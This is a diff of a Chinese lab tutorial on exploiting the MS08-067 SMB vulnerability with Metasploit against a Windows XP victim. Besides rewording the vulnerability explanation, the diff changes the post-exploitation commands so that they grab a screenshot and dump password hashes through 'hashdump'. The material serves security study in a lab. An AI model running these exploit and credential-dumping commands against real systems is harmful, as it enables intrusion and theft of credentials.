@@ -288,15 +288,14 @@ Windows 2000
 Windows XP
 Windows Server 2003
 ```
+MS08-067漏洞，具有里程碑意义，它影响的操作系统范围广，且伴随这个漏洞而来的将会是大量的蠕虫病毒，随着社会公共领域的不断信息化，在安全补丁尚未打全之前，坏人和犯罪份子绝不会错过这种漏洞利用的良机。[MS08-067漏洞的十年回顾](https://www.freebuf.com/articles/network/191787.html)文章记录了对MS08-067漏洞的回顾。  
 
-MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的NEtPathCanonicalize函数时触发的。NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。
 
-如果想了解该漏洞的原理知识，推荐以下三篇文章。
-
+MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行（Remote Code Execution）。  
+如果想了解该漏洞的原理知识，推荐以下三篇文章。  
 https://www.cnblogs.com/justforfun12/p/5239941.html  
 https://bbs.pediy.com/thread-251219.htm  
 https://www.freebuf.com/vuls/203881.html  
-MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。
 ### 二、环境搭建
 受害机：Windows XP SP1镜像  
 攻击机：Kali系统  
@@ -357,12 +356,13 @@ show options
 ```
 
 第五步，运行exploit反弹shell。
-此时我们成功获取了Windows XP系统的Shell，我们调用“ipconfig”查看的IP地址也是目标的 `192.168.163.137` 。
+此时我们成功获取了Windows XP系统的Shell，我们调用 `ipconfig` 查看的IP地址也是目标的 `192.168.163.137` 。
 ```bash
 exploit
 session 1
 ipconfig
-pwd
+screenshot
+hashdump
 ```
 注意：Windows XP SP1系统是中文而不是英文的，需要对ms08_067_netapi_ser2003_zh.rb处理。  
 
